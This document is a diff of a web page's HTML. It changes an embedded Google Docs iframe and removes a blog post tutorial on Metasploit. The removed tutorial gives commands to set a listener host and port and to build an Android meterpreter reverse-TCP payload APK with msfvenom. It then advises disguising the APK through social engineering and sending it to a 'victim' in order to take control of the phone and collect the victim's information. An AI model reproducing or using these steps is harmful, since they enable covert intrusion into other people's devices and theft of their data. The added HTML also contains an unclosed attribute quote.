@@ -43,60 +43,11 @@
     })
 
 </script>
+        <div class="arti>
         <div class="embed">
-<iframe src="https://docs.google.com/document/d/e/2PACX-1vR1mmlHf7UgTtQqb67aRwN0KKAM-qkl9_cAQM4uvoDE1IVLlNH03nR3SprylmWBTObEIKozj8GJidn_/pub?embedded=true" width="200%" height="1200"></iframe>
+                          <iframe src="https://docs.google.com/document/d/e/2PACX-1vQ88g6R8HVUdMs3t0UcInllzTym5orwLJXDaCx7PMYJlewPPahW7DcXa7MunC1uQZqCxJRqnvA1lw2n/pub?embedded=true" width="100%" height="1200" ></iframe>
+                          </div>
         </div>
-<div class="arti">
-<h1>Metasploit exploitation</h1>
-<p class="sub">posted on 6 Mar 2020 &copy;</p>
-<center><img src="yuva/2ENTk2K2_400x400.png" alt=""></center>
-<p class="artic">Metasploit framework exploitation<br>
-We all are inside the world of tech.Do you actually know what you are downloading from the internet? obviously we care about our privacy but here the question is to the what extent we are taking care!.<br>
-so here in this topic we will cover something called metasploit framework.its the enumeration tool through which your system can be hacked.<br>
-" If you know how to hack others device certainly you will safeguard your device. "<br>
-
-
-Before you read this, once do visit https://tools.kali.org/exploitation-tools/metasploit-framework there you can find some basic commands about exploiting. <br>
-
-what are the requirements? <br>
-Basically in this tutorial we use kali linux because metasploit comes free installed in kali linux distro.But you can use your mobile phone instead. <br>
-you can go and see https://wiki. Termux. Com/wiki/metasploit_framework to install metasploit framework in your android device. <br>
-If you are using your mobile make sure that you have enough storage about 5gb free space. <br>
-
-Lets get started . . ! <br>
-Open your kali linux distro or mobile terminal whatever you have. Follow the instruction or <br>
-paste the command in your terminal which is there in single quote one by one.<br>
-> 'msfconsole'<br>
-This command will get you into the metasploit framework.<br>
-Then immediately you have to check for  database connection<br>
-> 'db_status'<br>
-When you type this command it will display somethig like [*] postgresql selected, no connection it means that you don't have connection to your database. <br>
-To start database you have to type another command <br>
-> 'msfdb run'<br>
-Now we need to understand about port-forwarding so you can visit https://en.wikipedia.org/wiki/Port for exploit.<br>
-To handle vitims mobile in your ip address you have to set payload in your ip address to get control into. <br>
-> 'set lhost  192.168.00.000' <br>
-Above place you have to give your ip address as a host. To see your ip address open another terminal and type<br>
-> 'ifconfig'<br>
-It will show something like inet 192.188.43.027. <br>
-Now set some port through which it enters into victims mobile.<br>
-> 'set lport 3456'<br>
-You are almost set to exploit. <br>
-<center><img src="yuva/IMG-20200306-WA0018.jpg" alt=""></center>
-Now you have to create a payload and send it to the victim. To create a payload type the below command. And while typing make sure that you have entered your ip address in place of lhost and the same port address what you have given before. Type the apk name whatever you want. And you can embed this payload in other apk too by making use of social engineering. For instance you can watch this video <a>https://www.youtube.com/watch?v=Eo68tayiGOA</a>
->' msfvenom -p android/meterpreter/reverse_tcp set LPORT=3456 LHOST=192.167.23.000 R>blue.apk'<br>
-
-Now you are all set. Wait for victim to open the payload that you have sent.Once he opens type this<br>
->' exploit '<br>
-Now you can get all information of the victim. You can make use of following commands to get info <a>https://duckduckgo.com/?q=metasploit+commands&ia=cheatsheet&iax=1.</a>
-
-<center><img src="yuva/IMG-20200306-WA0017.jpg" alt=""></center>
-<br>-ಯುವಾ ರಾಘವ್</p>
-                                           </div>
-
-
-
-
 
 
 
